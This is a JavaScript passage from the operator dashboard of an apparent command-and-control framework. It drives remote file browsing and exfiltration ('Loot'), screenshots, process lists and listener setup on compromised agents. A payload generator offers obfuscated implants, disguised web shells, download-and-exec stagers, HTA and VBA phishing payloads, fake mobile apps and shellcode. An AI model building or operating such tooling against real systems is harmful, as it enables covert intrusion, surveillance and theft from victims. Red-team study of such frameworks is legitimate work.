        html += '<span style="color:var(--text-muted)">' + fileMatch[1] + '  ' + fileMatch[2].padStart(14) + '  </span>' +
          '<span style="color:var(--text-primary);">📄 ' + fname + '</span>' +
          ' <a href="#" onclick="fbDownload(\''+agent+'\',\''+fpath+'\');return false;" style="font-size:10px;color:var(--green);text-decoration:none;margin-left:6px;" title="Download file">⬇</a>\n';
        continue;
      }
    } else {
      // Parse ls -la output: drwxr-xr-x 2 root root 4096 Jan 1 12:00 dirname
      const lsMatch = trimmed.match(/^([d\-lrwxsStT]{10})\s+\d+\s+\S+\s+\S+\s+[\d,]+\s+\w+\s+\d+\s+[\d:]+\s+(.+)$/);
      if (lsMatch && lsMatch[2] !== '.' && lsMatch[2] !== '..') {
        const perms = lsMatch[1];
        const name = lsMatch[2];
        if (perms.startsWith('d')) {
          const fullPath = (normBase === '' ? '/' : normBase) + '/' + name;
          html += '<span style="color:var(--text-muted)">' + perms + '  </span>' +
            '<a href="#" onclick="browseDir(\'' + fullPath.replace(/'/g,"\\'") + '\');return false;" ' +
            'style="color:var(--cyan);cursor:pointer;text-decoration:none;font-weight:600;" ' +
            'onmouseover="this.style.textDecoration=\'underline\'" onmouseout="this.style.textDecoration=\'none\'">' +
            '📁 ' + name + '</a>\n';
          continue;
        } else if (perms.startsWith('l')) {
          html += '<span style="color:var(--text-muted)">' + perms + '  </span>' +
            '<span style="color:var(--accent-light);">🔗 ' + name + '</span>\n';
          continue;
        } else {
          const fullFilePath = ((normBase === '' ? '/' : normBase) + '/' + name).replace(/'/g,"\\'");
          const agent = getSelectedFBAgent();
          html += '<span style="color:var(--text-muted)">' + perms + '  </span>' +
            '<span style="color:var(--text-primary);">📄 ' + name + '</span>' +
            ' <a href="#" onclick="fbDownload(\''+agent+'\',\''+fullFilePath+'\');return false;" style="font-size:10px;color:var(--green);text-decoration:none;margin-left:6px;" title="Download file">⬇</a>\n';
          continue;
        }
      }
    }
    // Default: render line as-is (volume info, summary lines, etc.)
    html += '<span style="color:var(--text-muted)">' + trimmed.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</span>\n';
  }
  return html;
}

async function browseFiles() {
  const agent = getSelectedFBAgent(); if (!agent) return;
  fbCurrentOS = getAgentOS(agent);
  const defaultPath = fbCurrentOS === 'windows' ? 'C:\\' : '/';
  const path = document.getElementById('fb-path').value || defaultPath;
  fbCurrentPath = path;
  const output = document.getElementById('fb-output');
  output.textContent = 'Requesting directory listing...';
  const cmdLabel = fbCurrentOS === 'windows' ? 'dir ' + path : '$ ls -la ' + path;

  try {
    const resp = await fetch('/api/filebrowser?agent='+encodeURIComponent(agent)+'&path='+encodeURIComponent(path));
    const data = await resp.json();
    if (data.error) { output.textContent = 'Error: ' + data.error; return; }
    output.innerHTML = '<span style="color:var(--green)">Task queued (ID: '+data.task_id.substring(0,8)+')</span>\n\nWaiting for agent check-in...\nResults will appear below.';

    // Poll for result
    for (let i = 0; i < 20; i++) {
      await new Promise(r => setTimeout(r, 3000));
      const detail = await fetchJ('/api/agent/' + agent);
      if (detail.tasks && detail.tasks.length > 0) {
        const task = detail.tasks.find(t => data.task_id.startsWith(t.id) || t.id.startsWith(data.task_id.substring(0,8)));
        if (task && task.output && task.status !== 'pending' && task.status !== 'sent') {
          const parsed = parseDirOutput(task.output, path);
          output.innerHTML = '<div style="margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;">' +
            '<div>' + fbBreadcrumb(path) + '</div>' +
            '<span style="color:var(--text-muted);font-size:10px;">📁 click to nav · ⬇ click to download</span></div>' + parsed;
          return;
        }
      }
    }
    output.innerHTML += '\n\nTimeout - check agent tasks.';
  } catch(e) { output.textContent = 'Error: ' + e.message; }
}

function browseDir(path) {
  document.getElementById('fb-path').value = path;
  browseFiles();
}

// Trigger a file download from an agent path
async function fbDownload(agent, remotePath) {
  const out = document.getElementById('fb-output');
  const prev = out.innerHTML;
  out.innerHTML += '\n<span style="color:var(--accent-light)">⬇ Queuing download: ' + remotePath.replace(/</g,'&lt;') + '...</span>';
  try {
    const resp = await fetch('/api/download?agent='+encodeURIComponent(agent)+'&path='+encodeURIComponent(remotePath));
    const data = await resp.json();
    if (data.error) { out.innerHTML = prev + '\n<span style="color:var(--red)">Error: '+data.error+'</span>'; return; }
    out.innerHTML = prev + '\n<span style="color:var(--green)">✓ Download task queued (ID: '+data.task_id.substring(0,8)+'). Check Loot when agent checks in.</span>';
  } catch(e) { out.innerHTML = prev + '\n<span style="color:var(--red)">'+e.message+'</span>'; }
}

// Build a breadcrumb from a path string
function fbBreadcrumb(path) {
  const sep = fbCurrentOS === 'windows' ? '\\' : '/';
  const parts = path.replace(/^[\/\\]+|[\/\\]+$/g,'').split(/[\/\\]/);
  let built = fbCurrentOS === 'windows' ? '' : '/';
  const crumbs = parts.filter(Boolean).map((p, i) => {
    built += (i === 0 && fbCurrentOS === 'windows' ? '' : sep) + p;
    const dest = built;
    return '<a href="#" onclick="browseDir(\''+dest.replace(/\\/g,'\\\\').replace(/'/g,"\\'")+'\');return false;" style="color:var(--accent-light);text-decoration:none;" onmouseover="this.style.textDecoration=\'underline\'" onmouseout="this.style.textDecoration=\'none\'">'+p+'</a>';
  });
  const root = fbCurrentOS === 'windows' ? '' : '<a href="#" onclick="browseDir(\'/\');return false;" style="color:var(--text-muted);text-decoration:none;">/</a>';
  return root + crumbs.join('<span style="color:var(--text-muted);margin:0 3px;">'+sep+'</span>');
}

async function requestScreenshot() {
  const agent = getSelectedFBAgent(); if (!agent) return;
  const output = document.getElementById('ss-output');
  output.innerHTML = '<div style="text-align:center;color:var(--accent-light);padding:20px;">📸 Screenshot requested...<br><br>Waiting for agent check-in.<br>Result will appear in agent task history.</div>';

  try {
    const resp = await fetch('/api/screenshot?agent='+encodeURIComponent(agent));
    const data = await resp.json();
    if (data.error) { output.innerHTML = '<div style="color:var(--red);padding:20px;">'+data.error+'</div>'; return; }
    output.innerHTML = '<div style="text-align:center;padding:20px;"><div style="color:var(--green);margin-bottom:8px;">Screenshot task queued</div><div style="color:var(--text-muted);font-size:12px;">ID: '+data.task_id.substring(0,8)+'<br>Check agent detail for the captured image.</div></div>';
  } catch(e) { output.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
}

async function requestProcessList() {
  const agent = getSelectedFBAgent(); if (!agent) return;
  const output = document.getElementById('ps-output');
  output.textContent = 'Requesting process list...';

  try {
    const resp = await fetch('/api/processlist?agent='+encodeURIComponent(agent));
    const data = await resp.json();
    if (data.error) { output.textContent = 'Error: ' + data.error; return; }
    output.innerHTML = '<span style="color:var(--green)">Task queued (ID: '+data.task_id.substring(0,8)+')</span>\n\nWaiting for agent...';

    for (let i = 0; i < 20; i++) {
      await new Promise(r => setTimeout(r, 3000));
      const detail = await fetchJ('/api/agent/' + agent);
      if (detail.tasks && detail.tasks.length > 0) {
        const task = detail.tasks.find(t => data.task_id.startsWith(t.id) || t.id.startsWith(data.task_id.substring(0,8)));
        if (task && task.output && task.status !== 'pending' && task.status !== 'sent') {
          output.innerHTML = '<span style="color:var(--green)">$ ps aux</span>\n\n' + task.output;
          return;
        }
      }
    }
    output.innerHTML += '\n\nTimeout - check agent tasks.';
  } catch(e) { output.textContent = 'Error: ' + e.message; }
}

async function addNote() {
  const agent = getSelectedFBAgent(); if (!agent) return;
  const input = document.getElementById('note-input');
  const text = input.value.trim();
  if (!text) return;

  await fetch('/api/notes?agent='+encodeURIComponent(agent), {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({text: text})
  });
  input.value = '';
  loadNotes(agent);
}

async function loadNotes(agent) {
  const list = document.getElementById('notes-list');
  try {
    const notes = await fetchJ('/api/notes?agent='+encodeURIComponent(agent));
    if (!notes || notes.length === 0) {
      list.innerHTML = '<div style="color:var(--text-muted);font-size:12px;padding:8px;">No notes yet.</div>';
      return;
    }
    list.innerHTML = notes.map(n =>
      '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;margin-bottom:6px;">'+
      '<div style="display:flex;justify-content:space-between;font-size:11px;color:var(--text-muted);margin-bottom:4px;">'+
      '<span style="color:var(--accent-light);font-weight:600;">'+n.author+'</span>'+
      '<span>'+n.timestamp+'</span></div>'+
      '<div style="font-size:13px;">'+n.text+'</div></div>'
    ).join('');
  } catch(e) { list.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
}

async function searchOutput() {
  const query = document.getElementById('search-input').value.trim();
  if (!query) return;
  const results = document.getElementById('search-results');
  results.innerHTML = '<div style="color:var(--text-muted);padding:8px;">Searching...</div>';

  try {
    const data = await fetchJ('/api/search?q='+encodeURIComponent(query));
    if (!data || data.length === 0) {
      results.innerHTML = '<div style="color:var(--text-muted);padding:8px;">No results found for "'+query+'"</div>';
      return;
    }
    results.innerHTML = data.map(r =>
      '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;margin-bottom:6px;">'+
      '<div style="display:flex;justify-content:space-between;font-size:11px;margin-bottom:4px;">'+
      '<span style="color:var(--accent-light);font-weight:600;">'+r.agent+'</span>'+
      '<span style="color:var(--text-muted);">'+r.type+' | '+r.time+'</span></div>'+
      '<div style="font-size:12px;color:var(--cyan);margin-bottom:4px;font-family:monospace;">$ '+r.command+'</div>'+
      '<div style="font-size:12px;font-family:monospace;color:var(--text-primary);max-height:100px;overflow-y:auto;white-space:pre-wrap;">'+r.output+'</div></div>'
    ).join('');
  } catch(e) { results.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
}

// Update file browser agent selector on refresh
function updateFBAgentSelector(agents) {
  window._cachedAgents = agents;
  const sel = document.getElementById('fb-agent');
  if (!sel) return;
  const cur = sel.value;
  sel.innerHTML = '<option value="">Select an agent...</option>' + agents.map(a =>
    '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+a.name+' ('+a.os+' / '+a.hostname+')</option>'
  ).join('');

  // Update OS-specific buttons if agent selected
  if (sel.value) {
    fbCurrentOS = getAgentOS(sel.value);
    updateFBQuickButtons();
    loadNotes(sel.value);
  }
}

document.getElementById('fb-agent').addEventListener('change', function() {
  if (this.value) {
    fbCurrentOS = getAgentOS(this.value);
    updateFBQuickButtons();
    loadNotes(this.value);
  }
});

// ──── Listener Management ────
async function startListener(name) {
  try {
    const resp = await fetch('/api/listener/start?name='+encodeURIComponent(name));
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    refreshAll();
  } catch(e) { alert('Error: ' + e.message); }
}

async function stopListener(name) {
  if (!confirm('Stop listener "'+name+'"?')) return;
  try {
    const resp = await fetch('/api/listener/stop?name='+encodeURIComponent(name));
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    refreshAll();
  } catch(e) { alert('Error: ' + e.message); }
}

function onListenerTypeChange() {
  const typ = document.getElementById('ln-type').value;
  const isSMB = typ === 'smb';
  document.getElementById('ln-bind-wrap').style.display = isSMB ? 'none' : '';
  document.getElementById('ln-profile-wrap').style.display = isSMB ? 'none' : '';
  document.getElementById('ln-smb-note').style.display = isSMB ? 'block' : 'none';
}

async function createListener(savePreset) {
  const name = document.getElementById('ln-name').value.trim();
  const typ = document.getElementById('ln-type').value;
  const bind = document.getElementById('ln-bind').value.trim();
  const profile = document.getElementById('ln-profile').value;
  if (typ === 'smb') { alert('SMB is agent-side — use the SMB Pivot card in the Terminal tab to start a named pipe relay on an agent.'); return; }
  if (!name || !bind) { alert('Name and bind address are required'); return; }

  try {
    const resp = await fetch('/api/listener/create', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({name:name, type:typ, bind:bind, profile:profile, save:savePreset})
    });
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    document.getElementById('ln-name').value = '';
    document.getElementById('ln-bind').value = '';
    refreshAll();
  } catch(e) { alert('Error: ' + e.message); }
}

async function savePresetOnly() {
  const name = document.getElementById('ln-name').value.trim();
  const typ = document.getElementById('ln-type').value;
  const bind = document.getElementById('ln-bind').value.trim();
  const profile = document.getElementById('ln-profile').value;
  if (!name || !bind) { alert('Name and bind address are required'); return; }

  try {
    const resp = await fetch('/api/presets', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({action:'save', name:name, type:typ, bind:bind, profile:profile})
    });
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    document.getElementById('ln-name').value = '';
    document.getElementById('ln-bind').value = '';
    loadPresets();
  } catch(e) { alert('Error: ' + e.message); }
}

async function loadPresets() {
  const container = document.getElementById('presets-list');
  if (!container) return;
  try {
    const presets = await fetchJ('/api/presets');
    window._cachedPresets = presets;
    populateListenerSelector();
    populateBackdoorListeners();
    if (!presets || presets.length === 0) {
      container.innerHTML = '<div style="color:var(--text-muted);font-size:13px;padding:12px;text-align:center;">No saved presets.<br><span style="font-size:11px;">Create a listener and save it as a preset for quick reuse.</span></div>';
      return;
    }
    container.innerHTML = presets.map(p =>
      '<div style="display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:8px;margin-bottom:6px;">' +
      '<div>' +
        '<div style="font-weight:600;font-size:13px;color:var(--text-primary);">'+p.name+'</div>' +
        '<div style="font-size:11px;color:var(--text-muted);font-family:monospace;">'+p.type.toUpperCase()+' · '+p.bind+' · '+p.profile+'</div>' +
      '</div>' +
      '<div style="display:flex;gap:6px;">' +
        '<button class="qbtn" onclick="usePreset(\''+p.name+'\')" style="padding:5px 12px;font-size:11px;background:rgba(124,58,237,0.15);color:var(--accent-light);">🚀 Launch</button>' +
        '<button class="qbtn" onclick="deletePreset(\''+p.name+'\')" style="padding:5px 8px;font-size:11px;color:#ef4444;">✕</button>' +
      '</div></div>'
    ).join('');
  } catch(e) { container.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
}

async function usePreset(name) {
  try {
    const resp = await fetch('/api/presets', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({action:'use', name:name})
    });
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    refreshAll();
  } catch(e) { alert('Error: ' + e.message); }
}

async function deletePreset(name) {
  if (!confirm('Delete preset "'+name+'"?')) return;
  try {
    const resp = await fetch('/api/presets', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({action:'delete', name:name})
    });
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    loadPresets();
  } catch(e) { alert('Error: ' + e.message); }
}

// ──── Payload Generator ────
function populateListenerSelector() {
  const sel = document.getElementById('pl-listener-select');
  if (!sel) return;
  const cur = sel.value;
  let opts = '<option value="">-- Select a listener or preset --</option>';

  // Add running listeners
  if (window._cachedListeners && window._cachedListeners.length > 0) {
    opts += '<optgroup label="Active Listeners">';
    window._cachedListeners.forEach(l => {
      if (l.status === 'running') {
        const proto = l.type === 'HTTPS' ? 'https' : 'http';
        const url = proto + '://' + l.bind;
        opts += '<option value="'+url+'">'+l.name+' ('+url+')</option>';
      }
    });
    opts += '</optgroup>';
  }

  // Add presets
  if (window._cachedPresets && window._cachedPresets.length > 0) {
    opts += '<optgroup label="Saved Presets">';
    window._cachedPresets.forEach(p => {
      const proto = p.type === 'https' ? 'https' : 'http';
      const url = proto + '://' + p.bind;
      opts += '<option value="'+url+'">💾 '+p.name+' ('+url+')</option>';
    });
    opts += '</optgroup>';
  }

  sel.innerHTML = opts;
  if (cur) sel.value = cur;
}

// ──── Payload Generator — type card system ────
const PL_TYPES = {
  agent: [
    { value:'exe',        icon:'🪟', name:'Windows EXE',   desc:'amd64 · PE executable',      badge:'WINDOWS', bc:'rgba(99,102,241,0.15)', btc:'var(--violet-light)' },
    { value:'exe-garble', icon:'🪟', name:'Windows EXE',   desc:'Garble obfuscated',           badge:'OBFUSC',  bc:'rgba(139,92,246,0.25)', btc:'#c4b5fd' },
    { value:'dll',        icon:'📦', name:'Windows DLL',   desc:'rundll32 · regsvr32 · side',  badge:'DLL',     bc:'rgba(99,102,241,0.15)', btc:'var(--violet-light)' },
    { value:'elf',        icon:'🐧', name:'Linux ELF',     desc:'amd64 · ELF binary',          badge:'LINUX',   bc:'rgba(6,182,212,0.15)',  btc:'var(--cyan)' },
    { value:'elf-garble', icon:'🐧', name:'Linux ELF',     desc:'Garble obfuscated',           badge:'OBFUSC',  bc:'rgba(6,182,212,0.25)',  btc:'var(--cyan-light)' },
    { value:'darwin',     icon:'🍎', name:'macOS',         desc:'darwin/amd64 · Intel',        badge:'MACOS',   bc:'rgba(255,255,255,0.06)',btc:'#e5e7eb' },
  ],
  shell: [
    { value:'aspx', icon:'🌐', name:'ASPX Shell',    desc:'IIS / ASP.NET · 404 decoy',     badge:'IIS',    bc:'rgba(6,182,212,0.15)', btc:'var(--cyan)' },
    { value:'php',  icon:'🌐', name:'PHP Shell',     desc:'Apache · Nginx · 5 exec methods',badge:'PHP',    bc:'rgba(6,182,212,0.15)', btc:'var(--cyan)' },
    { value:'jsp',  icon:'🌐', name:'JSP Shell',     desc:'Tomcat / Java EE',               badge:'JAVA',   bc:'rgba(6,182,212,0.15)', btc:'var(--cyan)' },
  ],
  stager: [
    { value:'powershell', icon:'💻', name:'PowerShell', desc:'Download + exec cradle',    badge:'WINDOWS', bc:'rgba(99,102,241,0.15)', btc:'var(--violet-light)' },
    { value:'bash',       icon:'💻', name:'Bash',       desc:'curl / wget stager',        badge:'LINUX',   bc:'rgba(6,182,212,0.15)',  btc:'var(--cyan)' },
    { value:'python',     icon:'🐍', name:'Python',     desc:'Cross-platform · SSL',      badge:'CROSS',   bc:'rgba(6,182,212,0.15)',  btc:'var(--cyan)' },
  ],
  phishing: [
    { value:'hta', icon:'📧', name:'HTA App',     desc:'No macro warning · IE / MSHTA', badge:'PHISH', bc:'rgba(239,68,68,0.12)', btc:'#fca5a5' },
    { value:'vba', icon:'📧', name:'VBA Macro',   desc:'Word / Excel · AutoOpen',       badge:'PHISH', bc:'rgba(239,68,68,0.12)', btc:'#fca5a5' },
  ],
  mobile: [
    { value:'android', icon:'📱', name:'Android Pack',   desc:'Stager + phishing page',   badge:'APK',      bc:'rgba(6,182,212,0.15)', btc:'var(--cyan)' },
    { value:'ios',     icon:'🍎', name:'iOS Pack',       desc:'MDM profile + phishing',   badge:'IOS',      bc:'rgba(255,255,255,0.06)',btc:'#e5e7eb' },
    { value:'app',     icon:'📲', name:'Fake App',       desc:'30+ templates · full UI',  badge:'30+ TMPL', bc:'rgba(99,102,241,0.15)', btc:'var(--violet-light)' },
  ],
  shellcode: [
    { value:'shellcode', icon:'💉', name:'Donut PIC',    desc:'x64 shellcode · in-memory', badge:'SHELLCODE', bc:'rgba(239,68,68,0.12)', btc:'#fca5a5' },
  ],
};

let _plCurrentType = '';

function plCategory(cat) {
  // Update tab buttons
  ['agent','shell','stager','phishing','mobile','shellcode'].forEach(c => {
    const btn = document.getElementById('plcat-'+c);
    if (btn) { btn.className = c === cat ? 'pl-cat-btn pl-cat-active' : 'pl-cat-btn'; }
  });
  // Render cards
  const grid = document.getElementById('pl-type-cards');
  const types = PL_TYPES[cat] || [];
  grid.innerHTML = types.map(t =>
    '<div class="pl-type-card' + (_plCurrentType === t.value ? ' selected' : '') + '" onclick="plSelectType(\'' + t.value + '\')" id="plcard-' + t.value + '">' +
    '<div class="pt-icon">' + t.icon + '</div>' +
    '<div class="pt-name">' + t.name + '</div>' +
    '<div class="pt-desc">' + t.desc + '</div>' +
    '<span class="pt-badge" style="background:' + t.bc + ';color:' + t.btc + '">' + t.badge + '</span>' +
    '</div>'
  ).join('');
}

function plSelectType(val) {
  _plCurrentType = val;
  // Update all card selection states
  document.querySelectorAll('.pl-type-card').forEach(c => c.classList.remove('selected'));
  const card = document.getElementById('plcard-'+val);
  if (card) card.classList.add('selected');
  // Sync hidden select
  const sel = document.getElementById('pl-type');
  if (sel) sel.value = val;
  // Update badge
  const all = Object.values(PL_TYPES).flat();
  const meta = all.find(t => t.value === val);
  const badge = document.getElementById('pl-selected-badge');
  if (badge && meta) {
    badge.textContent = meta.icon + ' ' + meta.name + ' · ' + meta.badge;
    badge.style.background = meta.bc;
    badge.style.color = meta.btc;
    badge.style.borderColor = meta.btc.replace('var(--','').replace(')','');
  }
  onPayloadTypeChange();
}

function selectObf(val) {
  ['none','strip','garble'].forEach(v => {
    const el = document.getElementById('obf-'+v);
    if (!el) return;
    const active = v === val;
    el.style.border = active ? '2px solid var(--violet)' : '1px solid var(--border)';
    el.style.background = active ? 'var(--violet-dim)' : 'var(--bg-input)';
    el.querySelector('span:nth-child(2)').style.color = active ? 'var(--violet-light)' : 'var(--text-muted)';
    el.querySelector('input').checked = active;
  });
}

function onListenerSelect() {
  const sel = document.getElementById('pl-listener-select');
  if (sel.value) {
    document.getElementById('pl-url').value = sel.value;
  }
}

function onPayloadTypeChange() {
  const type = document.getElementById('pl-type').value;
  const appRow = document.getElementById('pl-app-row');
  if (type === 'app' || type === 'android') {
    appRow.style.display = 'block';
    loadAppTemplates();
  } else {
    appRow.style.display = 'none';
  }
  // DLL usage hint
  var hint = document.getElementById('pl-dll-hint');
  if (hint) hint.style.display = type === 'dll' ? 'block' : 'none';

  // Sync obfuscation radio to match the selected type
  const isGarble = type === 'exe-garble' || type === 'elf-garble';
  if (isGarble) {
    const radio = document.querySelector('input[name="pl-obfuscation"][value="garble"]');
    if (radio) radio.checked = true;
  } else {
    const radio = document.querySelector('input[name="pl-obfuscation"][value="none"]');
    if (radio) radio.checked = true;
  }
}

async function loadAppTemplates() {
  const sel = document.getElementById('pl-app-template');
  try {
    const templates = await fetchJ('/api/payload/apps');
    sel.innerHTML = templates.map(t =>
      '<option value="'+t.name+'">'+t.icon+' '+t.display+' ('+t.category+', '+t.perms+' perms)</option>'
    ).join('');
  } catch(e) {
    sel.innerHTML = '<option>Failed to load templates</option>';
  }
}

async function loadPayloadHistory() {
  const table = document.getElementById('payload-history-table');
  if (!table) return;
  try {
    const history = await fetchJ('/api/payload/history');
    if (!history || history.length === 0) {
      table.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--text-muted);padding:20px">No payloads generated yet</td></tr>';
      return;
    }
    table.innerHTML = history.slice().reverse().map(p => {
      const dlBtn = p.exists
        ? '<a href="/api/payload/download?file='+encodeURIComponent(p.filepath)+'" class="qbtn" style="font-size:11px;padding:4px 10px;text-decoration:none;color:var(--green);">⬇ Download</a>'
        : '<span style="font-size:10px;color:var(--text-muted);padding:4px 10px;border:1px solid var(--border);border-radius:4px;display:inline-block;">⚠ File missing</span>';
      return '<tr><td style="color:var(--accent-light);font-size:11px">'+p.id+'</td>' +
        '<td style="color:var(--cyan)">'+p.type+'</td>' +
        '<td style="font-family:monospace;font-size:11px">'+p.filename+'</td>' +
        '<td>'+p.size+'</td>' +
        '<td style="font-size:11px;color:var(--text-muted)">'+p.listener+'</td>' +
        '<td style="font-size:11px;color:var(--text-muted)">'+p.created_at+'</td>' +
        '<td>'+dlBtn+'</td></tr>';
    }).join('');
  } catch(e) {}
}

async function generatePayload() {
  const btn = document.getElementById('pl-btn');
  const output = document.getElementById('pl-output');
  const type = document.getElementById('pl-type').value;
  const url = document.getElementById('pl-url').value;
  const sleep = parseInt(document.getElementById('pl-sleep').value) || 10;
  const jitter = parseInt(document.getElementById('pl-jitter').value) || 20;
  const appTemplate = document.getElementById('pl-app-template').value;
  const obfuscateLevel = (document.querySelector('input[name="pl-obfuscation"]:checked') || {}).value || 'none';

  // Derive effective type: if radio says garble and base type is plain exe/elf, use garble variant
  let effectiveType = type;
  if (obfuscateLevel === 'garble') {
    if (type === 'exe') effectiveType = 'exe-garble';
    else if (type === 'elf') effectiveType = 'elf-garble';
  }

  btn.textContent = 'Generating...';
  btn.disabled = true;
  output.innerHTML = '<div style="text-align:center;padding:50px 20px;"><div style="font-size:32px;margin-bottom:12px;animation:spin 1.2s linear infinite;display:inline-block;">⚙️</div><div style="color:var(--accent-light);font-size:14px;font-weight:600;">Building payload...</div><div style="color:var(--text-muted);font-size:12px;margin-top:4px;">This may take a moment for obfuscated builds</div></div><style>@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}</style>';

  try {
    const resp = await fetch('/api/payload/generate', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        type: effectiveType,
        listener_url: url,
        sleep: sleep,
        jitter: jitter,
        app_template: appTemplate,
        obfuscate_level: obfuscateLevel
      })
    });
    const data = await resp.json();

    if (data.success) {
      const typeIcons = {exe:'🪟',elf:'🐧',darwin:'🍎',dll:'📦','svc-exe':'⚙️',aspx:'🌐',php:'🌐',jsp:'🌐',powershell:'💻',bash:'💻',python:'🐍',hta:'📧',vba:'📧',android:'📱',ios:'🍎',app:'📲',shellcode:'💉'};
      const icon = typeIcons[data.type] || typeIcons[effectiveType] || '📦';
      const obfBadge = obfuscateLevel === 'garble'
        ? '<span style="background:rgba(139,92,246,0.2);color:#a78bfa;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;letter-spacing:1px;margin-left:6px;">GARBLED</span>'
        : obfuscateLevel === 'strip'
        ? '<span style="background:rgba(59,130,246,0.2);color:var(--blue);padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;letter-spacing:1px;margin-left:6px;">STRIPPED</span>'
        : '';

      // Header
      let d = '<div style="text-align:center;padding:16px 0 12px;">'
        + '<div style="font-size:36px;margin-bottom:6px;">' + icon + '</div>'
        + '<div style="color:var(--green);font-weight:700;font-size:15px;letter-spacing:0.3px;">Payload Ready ' + obfBadge + '</div>'
        + '</div>';

      // Divider + metadata grid
      d += '<div style="border-top:1px solid var(--border);margin:0 -16px;"></div>';
      d += '<div style="display:grid;grid-template-columns:1fr 1fr;margin:0 -16px;">';

      const fn = data.filename || '—';
      const sz = data.size || '—';
      const ty = data.type || effectiveType;
      const cb = url;
      const metaRows = [
        ['FILE', '<code style="color:var(--accent-light);font-size:11px;word-break:break-all;">' + fn + '</code>', true, false],
        ['SIZE', '<span style="color:var(--blue);font-weight:600;">' + sz + '</span>', true, true],
        ['TYPE', '<span style="color:var(--cyan);">' + ty + '</span>', false, false],
        ['CALLBACK', '<code style="color:var(--text-primary);font-size:10px;word-break:break-all;">' + cb + '</code>', false, true],
      ];
      metaRows.forEach(function(r) {
        const label = r[0], val = r[1], hasBottom = r[2], isRight = r[3];
        const bb = hasBottom ? 'border-bottom:1px solid var(--border);' : '';
        const br = isRight ? '' : 'border-right:1px solid var(--border);';
        d += '<div style="padding:10px 16px;' + bb + br + '">'
          + '<div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:3px;">' + label + '</div>'
          + '<div style="font-size:12px;">' + val + '</div>'
          + '</div>';
      });
      d += '</div>';

      // Download button
      if (data.filepath) {
        const dlName = data.filename || 'Payload';
        const dlUrl = '/api/payload/download?file=' + encodeURIComponent(data.filepath);
        d += '<div style="border-top:1px solid var(--border);margin:0 -16px;padding:12px 16px;">'
          + '<a href="' + dlUrl + '" style="display:flex;align-items:center;justify-content:center;gap:8px;'
          + 'background:var(--green);color:#000;font-weight:700;font-size:13px;padding:11px 20px;'
          + 'border-radius:var(--radius);text-decoration:none;" '
          + 'onmouseover="this.style.opacity=\'.85\'" onmouseout="this.style.opacity=\'1\'">'
          + '⬇ &nbsp;Download ' + dlName + '</a>'
          + '</div>';
      }

      // Build output (collapsible if long)
      if (data.message) {
        const escaped = data.message.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
        const lines = escaped.split('\n');
        const preview = lines.slice(0, 3).join('\n');
        const hasMore = lines.length > 3;
        d += '<div style="border-top:1px solid var(--border);margin:0 -16px 0;padding:10px 16px 0;">'
          + '<div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;">Build Output</div>'
          + '<pre id="pl-msg-p" style="margin:0;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:' + (hasMore ? '6px 6px 0 0' : '6px') + ';font-size:11px;color:var(--green);white-space:pre-wrap;line-height:1.6;">' + preview + '</pre>';
        if (hasMore) {
          d += '<pre id="pl-msg-f" style="display:none;margin:0;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-top:none;border-radius:0 0 6px 6px;font-size:11px;color:var(--green);white-space:pre-wrap;line-height:1.6;">' + escaped + '</pre>'
            + '<button onclick="document.getElementById(\'pl-msg-f\').style.display=\'block\';document.getElementById(\'pl-msg-p\').style.borderRadius=\'6px 6px 0 0\';this.style.display=\'none\';" '
            + 'style="margin-top:4px;background:none;border:none;color:var(--text-muted);font-size:11px;cursor:pointer;padding:2px 0;">▼ Show full output</button>';
        }
        d += '</div>';
      }

      output.innerHTML = d;
      loadPayloadHistory();
    } else {
      const errMsg = (data.message || 'Unknown error').replace(/&/g,'&amp;').replace(/</g,'&lt;');
      output.innerHTML = '<div style="text-align:center;padding:24px 0 16px;">'
        + '<div style="font-size:32px;margin-bottom:8px;">❌</div>'
        + '<div style="color:var(--red);font-weight:700;font-size:14px;margin-bottom:8px;">Generation Failed</div>'
        + '<div style="background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.25);border-radius:6px;padding:10px 16px;text-align:left;font-size:12px;color:var(--text-muted);white-space:pre-wrap;line-height:1.6;">' + errMsg + '</div>'
        + '</div>';
    }
  } catch(e) {
    output.innerHTML = '<div style="text-align:center;padding:24px;color:var(--red);">⚠️ Request error: ' + e.message + '</div>';
  }

  btn.textContent = 'Generate Payload';
  btn.disabled = false;
}

// ──── SOCKS Tunnel ────
async function startTunnel() {
  const agent = document.getElementById('agent-select').value;
  if (!agent) { alert('Select an agent first'); return; }
